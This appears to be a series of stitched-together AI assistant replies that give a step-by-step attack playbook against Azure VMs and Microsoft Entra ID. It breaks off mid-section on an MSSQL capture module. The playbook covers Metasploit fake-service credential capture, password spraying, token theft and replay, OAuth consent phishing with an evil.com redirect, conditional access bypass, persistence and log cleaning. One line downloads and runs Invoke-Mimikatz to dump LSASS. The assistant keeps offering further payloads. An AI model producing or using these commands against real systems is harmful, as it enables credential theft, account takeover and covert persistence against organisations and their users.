## Credential dumping with Fake services

Sure! Here's a **corrected, cleaned-up, and detailed step-by-step summary** for performing **credential dumping using fake services on Azure Windows/Linux VMs**, focusing on local accounts, Active Directory (AD) accounts, and Microsoft Entra ID accounts.

------------------------------------------------------------------------

**Credential Dumping via Fake Services on Azure Windows/Linux VMs**

**Introduction**

Credential dumping using fake services involves setting up a fake server (e.g., FTP, SMB) to capture authentication credentials when a victim attempts to connect. This technique is often used during penetration testing to harvest credentials for local accounts, Active Directory accounts, or Microsoft Entra ID accounts.

Using Metasploit auxiliary modules, you can simulate common services that victims connect to, tricking them into providing credentials that are then captured by the attacker.

------------------------------------------------------------------------

**Environment Setup**

- Attacker machine: Kali Linux with Metasploit Framework (msfconsole)

- Target machine: Azure Windows or Linux VM

- Network: Ensure network connectivity between attacker and target (e.g., same VNET or accessible IP)

------------------------------------------------------------------------

**Step-by-Step Procedure**

**1. Launch Metasploit Console**

msfconsole

**2. Search for a Fake Service Module**

Example: To capture FTP credentials, use:

search capture/ftp

This will show the auxiliary/server/capture/ftp module which can fake an FTP server.

**3. Use the FTP Fake Server Module**

use auxiliary/server/capture/ftp

**4. Configure the Fake FTP Server**

- Set your attacker machine IP (server host):

set SRVHOST 192.168.0.102

- Optionally, set a custom banner to make it look legit:

set BANNER "Welcome to Hacking Articles"

**5. Run the Fake FTP Server**

exploit

The fake FTP server will now listen on port 21.

**6. Verify with Nmap Scan (Optional)**

From another terminal, scan the port to confirm the server is running:

nmap -p 21 192.168.0.102

You should see port 21 open.

**7. Victim Connects to Fake FTP Server**

If the target machine tries to connect to the fake FTP server:

ftp 192.168.0.102

The user will see the banner and a login prompt.

**8. Capturing Credentials**

- When the victim enters username and password, the fake service captures and displays these credentials in the Metasploit console.

- Example captured credentials:

User: raj

Password: 123

------------------------------------------------------------------------

**Exploitable Vulnerabilities in Azure VMs via This Method**

- **Weak Local Account Credentials:** Local user accounts with weak or reused passwords can be compromised.

- **Unrestricted Network Access:** Azure NSG (Network Security Group) rules that allow FTP or SMB traffic inbound without restrictions.

- **Lack of Multi-Factor Authentication (MFA):** For Microsoft Entra ID accounts, absence of MFA enables simple credential reuse.

- **Poor Monitoring:** Lack of monitoring for fake service detection or unusual authentication requests.

------------------------------------------------------------------------

**Important Notes**

- **This technique works mostly on local or AD accounts where the victim tries to authenticate to the fake service.** It does not directly dump Microsoft Entra ID tokens but can be a step in the chain to get credentials used to log in.

- **Social engineering or phishing** is often necessary to lure users to connect to the fake server.

- **Combining with internal pivoting:** If initial access is gained, fake services can be hosted inside Azure VNETs to catch lateral movement credentials.

------------------------------------------------------------------------

**Additional Fake Service Modules to Explore**

- auxiliary/server/capture/smb (Fake SMB Server)

- auxiliary/server/capture/http (Fake HTTP Basic Auth)

- auxiliary/server/capture/imap (Fake IMAP Server)

------------------------------------------------------------------------

**Summary of Commands Used**

| **Step** | **Command** | **Purpose** |
|----|----|----|
| Start Metasploit | msfconsole | Launch Metasploit framework |
| Search module | search capture/ftp | Find FTP fake server module |
| Select module | use auxiliary/server/capture/ftp | Load FTP fake server module |
| Configure server IP | set SRVHOST \<attacker-ip\> | Set IP for fake server |
| Set banner | set BANNER "Welcome to Hacking Articles" | Customize FTP banner |
| Run module | exploit | Start fake FTP server |
| Scan from another VM | nmap -p21 \<attacker-ip\> | Verify FTP port is open |
| Connect from victim | ftp \<attacker-ip\> | Victim connects to fake FTP server |

If you'd like, I can also prepare detailed steps for **other credential dumping methods** (e.g., mimikatz, secretsdump) or for exploiting **Microsoft Entra ID** in Azure environments.

Would you like me to continue with those?

Absolutely! Here's a detailed, step-by-step **penetration testing guide focused on Microsoft Entra ID (formerly Azure AD)** exploitation techniques within an Azure environment. This covers enumeration, credential abuse, token theft, and privilege escalation targeting Entra ID accounts.

------------------------------------------------------------------------

**Penetration Testing Microsoft Entra ID (Azure AD) in Azure Environments**

------------------------------------------------------------------------

**Overview**

Microsoft Entra ID is the cloud-based identity and access management service for Azure. It’s critical to test its security, especially since many attacks pivot through cloud identities. This guide assumes you have access to a compromised Azure VM or a foothold in the environment with some privileges.

------------------------------------------------------------------------

**Key Objectives**

- Enumerate Entra ID environment and users

- Dump and abuse tokens (access tokens, refresh tokens, ID tokens)

- Exploit weak authentication (password spray, brute force)

- Abuse service principals and app registrations

- Perform privilege escalation via role assignment abuse

- Use OAuth and MS Graph API to access data

------------------------------------------------------------------------

**Prerequisites**

- Access to Azure VM or an environment authenticated with Azure CLI or PowerShell

- Tools:

  - [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli)

  - [Microsoft Graph API tools](https://docs.microsoft.com/en-us/graph/use-the-api)

  - [Impacket](https://github.com/SecureAuthCorp/impacket)

  - [AzureAD PowerShell module](https://learn.microsoft.com/en-us/powershell/module/azuread)

  - [MSOL PowerShell module](https://learn.microsoft.com/en-us/powershell/module/msonline)

  - \[OAuth tools and token extractors (e.g., Rubeus for token abuse)\]

- Permissions to run scripts or commands inside the compromised environment

------------------------------------------------------------------------

**Step 1: Authenticate and Enumerate Entra ID Environment**

**1a. Authenticate using Azure CLI or PowerShell (if credentials or token available)**

az login --tenant \<tenant_id\> --username \<user\> --password \<password\>

or PowerShell

Connect-AzureAD

**1b. Enumerate users and groups (Azure CLI)**

az ad user list --output table

az ad group list --output table

**1c. Enumerate roles and assignments (Azure CLI)**

az role assignment list --all --output json

az role definition list --output json

------------------------------------------------------------------------

**Step 2: Dump and Abuse Tokens**

**2a. Dump Azure AD Tokens from Memory (on compromised VM)**

- Use tools like **Rubeus** (Windows) to dump Kerberos tickets and Azure AD tokens:

.\Rubeus.exe asktgt /user:\<username\> /password:\<password\> /domain:\<domain\>

.\Rubeus.exe dump

**2b. Extract tokens from browser or session files**

- Extract refresh and access tokens from browsers (Chrome/Edge) or token caches using tools like **SharpCloud** or manual search in %LOCALAPPDATA%\Packages\Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy\AC\\

------------------------------------------------------------------------

**Step 3: Password Spraying / Brute Force on Entra ID Accounts**

- Use tools like **Hydra** or **MSOLSpray** to attempt weak password brute forcing or spraying on Entra ID user accounts.

Example with Hydra:

hydra -L users.txt -P passwords.txt -s 443 -S -v -V \<tenant\>.onmicrosoft.com https-get

------------------------------------------------------------------------

**Step 4: Abuse Service Principals & App Registrations**

**4a. List all service principals with permissions**

az ad sp list --output json

**4b. Enumerate app registrations and check for excessive permissions**

az ad app list --output json

**4c. Attempt to reset credentials of service principals (if permissions allow)**

az ad sp credential reset --id \<service_principal_id\>

------------------------------------------------------------------------

**Step 5: Privilege Escalation via Role Assignment Abuse**

**5a. Check for roles assigned to users or service principals**

az role assignment list --all --output table

**5b. Attempt to assign roles to your user (if you have permission)**

az role assignment create --assignee \<user-object-id\> --role "Owner" --scope /subscriptions/\<subscription-id\>

------------------------------------------------------------------------

**Step 6: Query Microsoft Graph API for Sensitive Data**

**6a. Acquire access token for MS Graph API (using az account get-access-token)**

az account get-access-token --resource https://graph.microsoft.com/

**6b. Query users via Graph API**

curl -H "Authorization: Bearer \<access_token\>" https://graph.microsoft.com/v1.0/users

------------------------------------------------------------------------

**Step 7: Persistence and Cleanup**

- Register a new application or service principal to maintain access

- Create additional users or role assignments

- Use refresh tokens for long-lived access

- Clean logs or obfuscate traces using Azure Monitor and Azure AD audit logs (if accessible)

**Summary Table of Key Commands**

| **Task** | **Command / Tool Example** | **Notes** |
|----|----|----|
| Authenticate Azure CLI | az login | Requires credentials or token |
| Enumerate users/groups | az ad user list, az ad group list |  |
| List role assignments | az role assignment list --all |  |
| Dump tokens (Windows) | Rubeus.exe dump | Requires Windows VM access |
| Password spraying | hydra or msolspray | Target Entra ID credentials |
| Enumerate service principals | az ad sp list |  |
| Reset service principal creds | az ad sp credential reset | Requires sufficient permissions |
| Assign roles (priv escalation) | az role assignment create | Requires high privilege |
| Query MS Graph API | curl -H "Authorization: Bearer \<token\>" | Requires valid access token |

------------------------------------------------------------------------

**Key Azure VM Vulnerabilities Exploited**

- Weak or reused passwords on Entra ID accounts

- Over-permissioned service principals and app registrations

- Misconfigured role assignments allowing privilege escalation

- Insufficient monitoring of token usage and suspicious API calls

- Absence of MFA enforcement or conditional access policies

------------------------------------------------------------------------

If you want, I can prepare practical scripts or example payloads for these steps, or dive deeper into specific attack vectors such as **OAuth abuse, token replay, or conditional access bypass** techniques.

Would you like me to continue with those?

Got it! Here’s a detailed breakdown of **OAuth abuse, token replay, and conditional access bypass techniques** for Microsoft Entra ID (Azure AD) penetration testing — complete with how attackers exploit these, detailed steps, and some example commands/tools.

------------------------------------------------------------------------

**Advanced Microsoft Entra ID Pentesting Techniques**

**1. OAuth Abuse**

**What is OAuth Abuse?**

OAuth is the authorization protocol Microsoft Entra ID uses to grant delegated access to resources via tokens. Attackers abuse OAuth by:

- Registering malicious apps with excessive permissions

- Consent phishing (tricking users/admins to approve rogue apps)

- Using stolen refresh tokens to maintain persistent access

**Common OAuth Abuse Techniques**

**a) Consent Phishing to Get Elevated Access**

- Attacker creates or leverages a malicious app registration.

- Triggers an OAuth consent prompt to an admin or user.

- Once consented, app gets delegated permissions (e.g., reading users, groups, mail).

**Steps:**

1.  Register malicious app:

2.  az ad app create --display-name "EvilApp" --reply-urls "https://evil.com" --required-resource-accesses @permissions.json

*(permissions.json defines high-privilege scopes like User.Read.All)*

3.  Send consent URL to target:

4.  https://login.microsoftonline.com/\<tenant-id\>/oauth2/v2.0/authorize?

5.  client_id=\<app-client-id\>&

6.  response_type=code&

7.  redirect_uri=https://evil.com&

8.  response_mode=query&

9.  scope=User.Read.All Mail.Read&

10. state=12345

11. Once user/admin accepts, attacker uses the authorization code to get tokens.

12. Use the token to call Microsoft Graph API and extract sensitive data.

------------------------------------------------------------------------

**b) Using Stolen Refresh Tokens for Persistent Access**

- If an attacker obtains a refresh token (from disk, memory, or phishing), they can continually generate access tokens without user interaction.

**Example:**

Use tools like [MSOLToken](https://github.com/gentschow/MSOLToken) or custom scripts:

curl -X POST -d "grant_type=refresh_token&client_id=\<client_id\>&refresh_token=\<refresh_token\>&scope=openid" https://login.microsoftonline.com/\<tenant_id\>/oauth2/v2.0/token

------------------------------------------------------------------------

**2. Token Replay Attacks**

**What is Token Replay?**

Reusing stolen access tokens or ID tokens to impersonate a user without needing credentials.

**How to Perform Token Replay**

- Capture tokens (via browser, memory, network sniffing).

- Use intercepted tokens directly against Microsoft Graph or Azure resources.

- Tokens are bearer tokens: possession equals access until expiry.

------------------------------------------------------------------------

**Example using intercepted token:**

curl -H "Authorization: Bearer \<access_token\>" https://graph.microsoft.com/v1.0/me

**Tools for Token Replay**

- [Rubeus](https://github.com/GhostPack/Rubeus) (Windows Kerberos tickets and Azure tokens)

- Browser dev tools to extract tokens from local storage

- Network proxies (mitmproxy) in poorly secured environments

------------------------------------------------------------------------

**3. Conditional Access (CA) Bypass Techniques**

**What is Conditional Access?**

Conditional Access policies enforce access controls (e.g., MFA, device compliance).

**Bypass Techniques**

**a) Legacy Authentication Bypass**

- Many CA policies exclude legacy authentication protocols (IMAP, SMTP, POP).

- Attackers force use of legacy protocols to bypass CA enforcement.

**Pentest:**

Try to authenticate using legacy protocols with valid credentials:

openssl s_client -connect outlook.office365.com:993

Try LOGIN with username/password.

If CA not enforced on legacy auth, credentials accepted without MFA.

------------------------------------------------------------------------

**b) Token Replay on Fresh Tokens to Bypass CA**

- CA often triggers MFA only on token issuance.

- Replaying a previously obtained valid token can bypass CA checks until token expiry.

------------------------------------------------------------------------

**c) Exploiting App-Only Tokens**

- Some CA policies target user sign-ins but do not block app-only tokens.

- Attacker abuses app registrations with app-only permissions to access resources without CA triggers.

------------------------------------------------------------------------

**d) Using Compliant Devices or Trusted IPs**

- If CA is configured to allow access from trusted IPs or compliant devices, attacker can pivot through these to bypass CA.

------------------------------------------------------------------------

**Summary Table**

| **Technique** | **Description** | **Exploit Steps/Commands** | **Tools** |
|----|----|----|----|
| OAuth Consent Phishing | Trick user/admin to grant app permissions | Register app → send consent link → exchange code for token | Azure CLI, Browser |
| Refresh Token Abuse | Use stolen refresh token for long-term access | POST refresh token to token endpoint | curl, MSOLToken |
| Token Replay | Use stolen access token to impersonate user | Use token as bearer token in API requests | curl, Rubeus |
| Legacy Authentication Bypass | Exploit CA exclusions for legacy auth | Authenticate via IMAP/SMTP with creds | openssl s_client, telnet |
| App-Only Token Abuse | Use app tokens that bypass CA policies | Register app with app-only perms and query APIs | Azure CLI, MS Graph API |

------------------------------------------------------------------------

**Recommendations for Defense (for completeness)**

- Enforce MFA on all authentication flows including legacy protocols.

- Monitor and restrict app registrations and permissions.

- Audit and block legacy authentication if not needed.

- Detect suspicious OAuth consent events.

- Implement Conditional Access policies to include app-only tokens and refresh token lifetimes.

------------------------------------------------------------------------

If you want, I can also prepare demo scripts or simulated attack scenarios for any of these techniques. Would you like that?

Certainly! Here’s a **cleaned-up, corrected, and detailed summary** on how to perform **credential dumping using fake services** during penetration testing on Azure Windows/Linux VMs for **Local accounts, Active Directory accounts, and Microsoft Entra ID accounts** — including commands, steps, and exploited vulnerabilities, with duplicates removed:

------------------------------------------------------------------------

**Credential Dumping Using Fake Services on Azure VMs**

------------------------------------------------------------------------

**Overview**

This technique uses Metasploit auxiliary modules to set up **fake service servers (Telnet, VNC, SMB)** that impersonate legitimate services to capture authentication credentials (cleartext or hashes) from users connecting to these fake services.

Such fake services exploit weak authentication practices and unencrypted protocols often found in poorly configured Azure VMs or on-premises AD environments.

------------------------------------------------------------------------

**Prerequisites**

- Access to attacker machine (e.g., Kali Linux) with Metasploit Framework installed.

- IP address configured for the fake server (e.g., 192.168.0.102).

- Target Azure VM or local network clients potentially connecting to those services.

- Tools: msfconsole, nmap, telnet, vncviewer, john (John the Ripper).

------------------------------------------------------------------------

**1. Fake Telnet Service Credential Capture**

**Telnet** uses port **23** and transmits credentials in plaintext, making it a prime target.

**Steps:**

1.  Start Metasploit console:

2.  msfconsole

3.  Load fake Telnet capture module:

4.  use auxiliary/server/capture/telnet

5.  Configure listener options:

6.  set srvhost 192.168.0.102

7.  set banner "Welcome to Hacking Articles"

8.  Start the fake Telnet service:

9.  exploit

10. Confirm port is open:

11. nmap -p23 192.168.0.102

12. From victim/client, connect using Telnet:

13. telnet 192.168.0.102

Victim sees a login prompt with the banner and is prompted for username and password.

14. User enters credentials; authentication fails, but credentials are captured by Metasploit.

------------------------------------------------------------------------

**2. Fake VNC Service Credential Capture**

**VNC** uses port **5900** for remote desktop control; credentials are hashed but can be captured and cracked.

**Steps:**

1.  In Metasploit:

2.  use auxiliary/server/capture/vnc

3.  set srvhost 192.168.0.102

4.  set johnpwfile /root/Desktop/vnc_hashes

5.  exploit

6.  Verify port open:

7.  nmap -p5900 192.168.0.102

8.  Victim connects via VNC client:

9.  vncviewer 192.168.0.102

10. User prompted for credentials, which are hashed and saved to the johnpwfile.

11. Authentication fails but hash captured for offline cracking.

------------------------------------------------------------------------

**3. Fake SMB Service Credential Capture**

**SMB** (port **445**) is used for file and printer sharing in Windows networks.

**Steps:**

1.  Load Metasploit SMB capture module:

2.  use auxiliary/server/capture/smb

3.  set srvhost 192.168.0.102

4.  set johnpwfile /root/Desktop/smb_hashes

5.  exploit

6.  Verify SMB port is open:

7.  nmap -p445 192.168.0.102

8.  When a victim tries to access a shared folder, the fake SMB server triggers a Windows authentication prompt.

9.  Victim enters credentials; an NTLMv2 hash is captured.

10. Hashes are saved in John the Ripper format for cracking:

11. john --format=netntlmv2 /root/Desktop/smb_hashes

12. Cracked credentials are revealed (e.g., username Raj with password 123).

------------------------------------------------------------------------

**Azure VM Vulnerabilities Exploited**

- **Use of insecure protocols** (Telnet, SMB v1) that transmit or negotiate credentials without strong encryption.

- **Users connecting to unknown or rogue services** on commonly used ports.

- **Lack of network segmentation or firewall rules** allowing access to these services.

- **Absence of MFA or other protections** to mitigate credential capture attacks.

- **Credential reuse** facilitates further lateral movement after hash cracking.

------------------------------------------------------------------------

**Summary of Commands**

| **Service** | **Metasploit Module** | **Key Commands** | **Ports** | **Credential Type Captured** |
|----|----|----|----|----|
| Telnet | auxiliary/server/capture/telnet | set srvhost \<IP\>, exploit | 23 | Cleartext username/password |
| VNC | auxiliary/server/capture/vnc | set johnpwfile \<path\>, exploit | 5900 | Hashed passwords |
| SMB | auxiliary/server/capture/smb | set johnpwfile \<path\>, exploit | 445 | NTLMv2 challenge-response hashes |

------------------------------------------------------------------------

**Notes**

- Always **perform pentesting activities with proper authorization**.

- Capture files containing hashes must be cracked offline using **John the Ripper** or similar.

- These techniques primarily target **local accounts** and **AD domain accounts** used for SMB/Telnet/VNC.

- **Microsoft Entra ID (Azure AD) accounts** typically are not exposed via these legacy protocols but may be compromised downstream through credential reuse or lateral movement.

------------------------------------------------------------------------

Would you like me to provide the next steps for cracking captured hashes, lateral movement after credential capture, or Azure AD focused exploitation?

Great! Here’s a detailed, corrected, and step-by-step summary of how to perform **penetration testing targeting Microsoft Entra ID (Azure AD) accounts** after initial credential dumping or via direct Azure AD exploitation techniques. This complements the previous local/AD credential dumping methods and focuses on cloud identity compromise.

------------------------------------------------------------------------

**Azure AD (Microsoft Entra ID) Penetration Testing Guide**

------------------------------------------------------------------------

**Overview**

Azure AD (now Microsoft Entra ID) is the cloud identity and access management service. Pentesting Azure AD focuses on abusing identity, OAuth, token-related vulnerabilities, and misconfigurations to escalate privileges, access sensitive resources, or maintain persistence.

------------------------------------------------------------------------

**1. Initial Access and Enumeration**

**a) Using Dumped Credentials**

- Credentials captured locally (cleartext or hashes) or via phishing can be tried against Azure AD if password sync is enabled.

- Use tools like **AzureADPasswordSpray**, **CredNinja**, or **kerbrute** to validate credentials or spray attacks against Azure AD.

Example:

python3 AzureADPasswordSpray.py -d contoso.com -u userlist.txt -p 'Password123'

**b) Discover Azure AD Information**

- Use **Microsoft Graph API** to enumerate users, groups, roles (requires some level of permissions).

- Use **az cli** if you have a token or valid creds:

az login

az ad user list --output table

------------------------------------------------------------------------

**2. OAuth and Token Abuse**

**a) Abuse OAuth Consent**

- Phish admin/user consent for rogue app registrations.

- Use consent URL to trick users to grant high-privilege permissions.

Generate consent URL:

https://login.microsoftonline.com/\<tenant-id\>/oauth2/v2.0/authorize?

client_id=\<app-client-id\>&

response_type=code&

redirect_uri=https://evil.com&

scope=User.Read.All Mail.Read&

response_mode=query&

state=12345

Once consented, use the code to get tokens:

curl -X POST -d "client_id=\<app-id\>&scope=User.Read.All&code=\<auth-code\>&redirect_uri=https://evil.com&grant_type=authorization_code" https://login.microsoftonline.com/\<tenant-id\>/oauth2/v2.0/token

------------------------------------------------------------------------

**b) Use Refresh Token Replay**

- If you get refresh tokens (e.g., via phishing or local dump of browser tokens), renew access tokens without user interaction.

Example:

curl -X POST -d "client_id=\<app_id\>&refresh_token=\<refresh_token\>&grant_type=refresh_token&scope=openid" https://login.microsoftonline.com/\<tenant_id\>/oauth2/v2.0/token

------------------------------------------------------------------------

**3. Password Spraying & Brute Force**

- Use **password spraying** (trying common passwords against many users) to bypass lockout policies.

Tools: **MSOLSpray**, **SprayAzureAD**

python3 SprayAzureAD.py -u users.txt -p 'Summer2024'

------------------------------------------------------------------------

**4. Privilege Escalation and Persistence in Azure AD**

**a) Abuse Application Registrations**

- Check if you can register applications with **privileged API permissions**.

- Use Azure CLI or PowerShell to list app registrations:

az ad app list --query "\[\].{appId:appId, displayName:displayName}" --output table

- Exploit misconfigured apps to get app-only tokens and query sensitive information.

------------------------------------------------------------------------

**b) Exploit Role Assignments and Privileged Identity Management (PIM)**

- Enumerate role assignments:

az role assignment list --all --output table

- Look for **Privileged Role Administrators**, **Global Admins**, or **Conditional Access Admins**.

- Attempt to escalate privileges by abusing delegated roles or misconfigured policies.

------------------------------------------------------------------------

**c) Abuse Conditional Access Bypass Techniques**

- Use legacy protocols or app-only tokens to bypass MFA policies (detailed in previous answer).

------------------------------------------------------------------------

**5. Token Theft and Replay**

- Use tools like **Rubeus** or browser dev tools to steal tokens.

- Replay tokens to impersonate users.

------------------------------------------------------------------------

**6. Lateral Movement and Persistence**

- Use compromised Azure AD credentials or tokens to access:

  - Azure Portal ([https://portal.azure.com](https://portal.azure.com/))

  - Microsoft 365 resources (mail, SharePoint)

  - Azure CLI or PowerShell sessions for VM or resource access.

------------------------------------------------------------------------

**7. Commands and Tools Summary**

| **Activity** | **Commands/Tools** | **Notes** |
|----|----|----|
| Credential Validation | AzureADPasswordSpray.py | Spray passwords against Azure AD users |
| User Enumeration | az ad user list | Requires login/token |
| OAuth Consent Phishing | Generate OAuth URL + curl token exchange | Requires social engineering |
| Refresh Token Replay | curl POST with refresh token | Requires stolen token |
| Application Enumeration | az ad app list | Check for misconfigured app permissions |
| Role Enumeration | az role assignment list --all | Look for privileged roles |
| Token Theft & Replay | Rubeus, Browser Dev Tools | Steal & replay tokens |

------------------------------------------------------------------------

**Final Notes**

- Microsoft Entra ID pentesting is heavily reliant on **credential acquisition**, **token manipulation**, and **misconfiguration discovery**.

- Always confirm you have **proper authorization** before engaging in these activities.

- Mitigations include enforcing MFA, limiting app registrations, monitoring OAuth consents, and restricting legacy auth.

------------------------------------------------------------------------

If you want, I can help you with **sample scripts, detailed exploitation examples, or detection/mitigation strategies** for Azure AD pentesting. Would you like me to prepare those?

Absolutely! Here’s a concise but detailed set of **sample scripts and exploitation examples** for **Active Directory (AD) penetration testing** focusing on common AD attacks: **credential dumping, password spraying, LDAP enumeration, and abuse of delegation**. These will help simulate attacks on AD environments (typical in Azure Windows VMs joined to AD or on-premises AD).

------------------------------------------------------------------------

**Active Directory Pentest Sample Scripts & Exploitation Examples**

------------------------------------------------------------------------

**1. Credential Dumping: Extracting NTLM Hashes from a Compromised Windows VM**

**Using Mimikatz (PowerShell)**

If you have a shell on the target Windows VM, run:

Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')

Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

**What it does:** Extracts cleartext passwords, NTLM hashes, and Kerberos tickets from LSASS memory.

------------------------------------------------------------------------

**2. Password Spraying Using Impacket’s spray.py**

Try common passwords against a list of AD users to avoid lockouts.

python3 /path/to/impacket/examples/spray.py -users users.txt -passwords passwords.txt -domain contoso.local -dc-ip 192.168.0.100

- users.txt contains usernames.

- passwords.txt contains common passwords (e.g., Summer2024, Password123!).

- -dc-ip is domain controller IP.

**Output:** Valid credentials without triggering lockout.

------------------------------------------------------------------------

**3. LDAP Enumeration with ldapsearch**

Discover users, groups, computers via LDAP.

ldapsearch -x -h dc01.contoso.local -b "dc=contoso,dc=local" "(objectClass=user)" sAMAccountName

- -x for simple authentication.

- -b is base DN.

- Adjust hostname and DN per your environment.

------------------------------------------------------------------------

**4. Kerberos AS-REP Roasting (for users without pre-authentication)**

Using Impacket’s GetNPUsers.py:

python3 GetNPUsers.py contoso.local/ -usersfile users.txt -format hashcat -output asrep.hashes

Then crack hashes offline with Hashcat:

hashcat -m 18200 asrep.hashes wordlist.txt

------------------------------------------------------------------------

**5. Abuse of Kerberos Delegation**

**Check computers with unconstrained delegation**

Using PowerView (PowerShell):

Import-Module .\PowerView.ps1

Get-ADComputer -Filter {TrustedForDelegation -eq \$true} -Properties TrustedForDelegation \| Select-Object Name

If you have access to such a machine, you can impersonate users by requesting delegated tickets.

------------------------------------------------------------------------

**6. Dumping LAPS Passwords (Local Admin Password Solution)**

If LAPS is deployed:

Get-ADComputer -Filter \* -Properties ms-MCS-AdmPwd \| Select-Object Name,ms-MCS-AdmPwd

This shows local admin passwords stored in AD.

------------------------------------------------------------------------

**7. Sample Python Script: Simple LDAP User Enumeration**

import ldap

LDAP_SERVER = "ldap://dc01.contoso.local"

BASE_DN = "dc=contoso,dc=local"

conn = ldap.initialize(LDAP_SERVER)

conn.simple_bind_s("", "") \# Anonymous bind or replace with creds

results = conn.search_s(BASE_DN, ldap.SCOPE_SUBTREE, "(objectClass=user)", \['sAMAccountName'\])

for dn, entry in results:

print(entry.get('sAMAccountName'))

------------------------------------------------------------------------

**Summary**

| **Technique** | **Tool/Script** | **Purpose** |
|----|----|----|
| Credential Dumping | Mimikatz (PowerShell) | Extract hashes & cleartext passwords |
| Password Spraying | Impacket spray.py | Discover valid credentials |
| LDAP Enumeration | ldapsearch, Python ldap | Discover users, groups |
| AS-REP Roasting | Impacket GetNPUsers.py | Crack users without pre-authentication |
| Delegation Abuse | PowerView PowerShell module | Identify & exploit Kerberos delegation |
| LAPS Password Retrieval | PowerShell Get-ADComputer | Retrieve local admin passwords |

------------------------------------------------------------------------

If you want, I can provide:

- **Step-by-step exploitation demos** for each (with output examples),

- **Automated PowerShell or Python scripts** for advanced enumeration,

- **Post-exploitation lateral movement techniques** using dumped creds.

Would you like me to prepare those next?

Certainly! Here's a **corrected and concise summary** on **how to perform credential dumping using fake services** during a pentest on **Azure Windows/Linux VMs**, covering **Local accounts, AD accounts, and Microsoft Entra ID** contexts, with detailed steps, commands, and typical vulnerabilities exploited — duplicates removed and polished for clarity:

------------------------------------------------------------------------

**Credential Dumping Using Fake Services on Azure VMs (Windows/Linux)**

This technique leverages **Metasploit auxiliary modules** that simulate various network services (HTTP, POP3, SMTP, PostgreSQL, etc.) to **capture authentication credentials** when a victim connects and attempts to authenticate.

These fake services exploit the **lack of credential validation and user awareness** to trick victims into submitting usernames and passwords, which are captured for further use (e.g., lateral movement, privilege escalation).

------------------------------------------------------------------------

**General Prerequisites**

- Attacker control on a VM or machine (e.g., Kali Linux) within Azure network or with network access to target.

- Target VM IP address (Azure Windows/Linux VM).

- Metasploit Framework installed.

------------------------------------------------------------------------

**1. HTTP Basic Authentication Capture**

- **Port:** 80 (HTTP)

- **Purpose:** Generates HTTP 401 Unauthorized prompts, triggering browsers to ask for credentials, which are then captured.

**Steps & Commands:**

msfconsole

use auxiliary/server/capture/http_basic

set srvhost 192.168.0.102 \# Attacker machine IP

set uripath sales \# URL path for the fake login

set RedirectURL www.hackingarticles.in \# Redirect after capture

exploit

- Nmap scan from attacker or victim to verify port:

nmap -p80 192.168.0.102

- Victim opens http://192.168.0.102/sales and enters credentials in the prompt.

- Captured credentials example:

User: raj

Password: 123

------------------------------------------------------------------------

**2. POP3 Fake Service**

- **Port:** 110 (POP3 email retrieval)

- **Purpose:** Simulates POP3 server, captures email login credentials.

**Steps & Commands:**

msfconsole

use auxiliary/server/capture/pop3

set srvhost 192.168.0.102

exploit

- Nmap scan to verify open port:

nmap -p110 192.168.0.102

- Connect via Telnet or mail client:

telnet 192.168.0.102 110

- Victim submits username and password (believing it's genuine).

- Credentials captured:

User: raj

Password: 123

------------------------------------------------------------------------

**3. SMTP Fake Service**

- **Port:** 25 (SMTP mail sending)

- **Purpose:** Simulates SMTP server, captures credentials during mail sending/authentication.

**Steps & Commands:**

msfconsole

use auxiliary/server/capture/smtp

set srvhost 192.168.0.102

exploit

- Nmap port scan:

nmap -p25 192.168.0.102

- Connect via Telnet:

telnet 192.168.0.102 25

- Victim enters credentials during session.

- Credentials captured:

User: raj

Password: 123

------------------------------------------------------------------------

**4. PostgreSQL Fake Service**

- **Port:** 5432 (PostgreSQL database)

- **Purpose:** Simulates PostgreSQL server, captures clear-text login credentials.

**Steps & Commands:**

msfconsole

use auxiliary/server/capture/postgresql

set srvhost 192.168.0.102

exploit

- Verify open port:

nmap -p5432 192.168.0.102

- Connect using PostgreSQL client:

psql -h 192.168.0.102 -U raj

- Victim provides username/password.

- Credentials captured:

User: raj

Password: 123

------------------------------------------------------------------------

**Typical Azure VM Vulnerabilities Exploited**

- **Open/Exposed ports** without proper firewall or NSG restrictions.

- **Lack of multi-factor authentication (MFA)** and use of basic authentication protocols.

- **Users trusting spoofed login prompts** (phishing attack surface).

- **Plain-text or weakly protected credentials** over legacy protocols.

- Insufficient network segmentation allowing attackers to reach these services.

- **Poor monitoring and alerting** on unusual authentication attempts or failed login events.

------------------------------------------------------------------------

**Summary**

| **Service** | **Port** | **Command Example** | **Purpose** | **Captured Data** |
|----|----|----|----|----|
| HTTP Basic | 80 | use auxiliary/server/capture/http_basic | Capture Basic Auth credentials | Username/Password |
| POP3 | 110 | use auxiliary/server/capture/pop3 | Capture POP3 email creds | Username/Password |
| SMTP | 25 | use auxiliary/server/capture/smtp | Capture SMTP login creds | Username/Password |
| PostgreSQL | 5432 | use auxiliary/server/capture/postgresql | Capture DB login creds | Username/Password |

------------------------------------------------------------------------

If you want, I can also prepare **post-exploitation steps** such as:

- Using captured hashes for **pass-the-hash** or cracking offline.

- Pivoting inside Azure network.

- Escalating privileges via local or AD accounts.

- Abuse scenarios for Microsoft Entra ID with those credentials.

Would you like me to?

Certainly! Here is a **corrected, concise, and well-organized summary** explaining how to perform credential dumping using **fake services** on Azure Windows/Linux VMs for **Local, AD, and Microsoft Entra ID accounts** with detailed steps, commands, and vulnerabilities exploited, cleaned up to remove duplicates and clarify the flow:

------------------------------------------------------------------------

**Credential Dumping Using Fake Services on Azure Windows/Linux VMs**

This pentesting technique uses **Metasploit auxiliary modules** to simulate common network services (MSSQL, HTTP NTLM, MySQL, etc.) to **capture authentication credentials** from users connecting to these fake services. This is particularly useful for gathering credentials of **Local accounts, AD accounts, and Microsoft Entra ID accounts** (via password reuse or service logins).

------------------------------------------------------------------------

**General Requirements**

- Control of an attacker VM within Azure network or able to reach target Azure VM.

- Metasploit Framework installed.

- Target IP and knowledge of open service ports (via Nmap).

------------------------------------------------------------------------

**Step-by-Step Process and Commands**

**1. MSSQL Fake Service**

- **Port:** 1433 (Microsoft SQL Server)

- **Purpose:** Capture both weakly encoded database logins and Windows NTLM logins.

msfconsole

use auxiliary/server/capture/mssql

set srvhost 192.168.0.102 \# Your attacker VM IP

exploit

